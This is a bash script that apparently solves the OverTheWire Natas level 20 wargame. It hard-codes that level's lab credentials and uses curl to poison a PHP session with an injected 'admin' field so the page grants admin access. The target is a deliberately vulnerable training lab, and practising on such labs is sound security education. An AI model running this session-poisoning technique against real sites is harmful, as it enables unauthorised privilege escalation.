#!/bin/bash
USER="natas20"
PASS="p5mCvP7GS2K6Bmt3gqhM2Fc1A5T8MVyw"
URL="http://natas20.natas.labs.overthewire.org/"

# Step 1: Get PHPSESSID
PHPSESSID=$(curl -s -u $USER:$PASS -c - "$URL" | grep PHPSESSID | awk '{print $7}')
echo "[*] Using PHPSESSID=$PHPSESSID"

# Step 2: Poison the session (store admin=1)
curl -s -u $USER:$PASS -b "PHPSESSID=$PHPSESSID" -d "name=abc&name[admin]=1" "$URL" > /dev/null

# Step 3: Reload the page with the same session ID and print full response
curl -s -u $USER:$PASS -b "PHPSESSID=$PHPSESSID" "$URL"
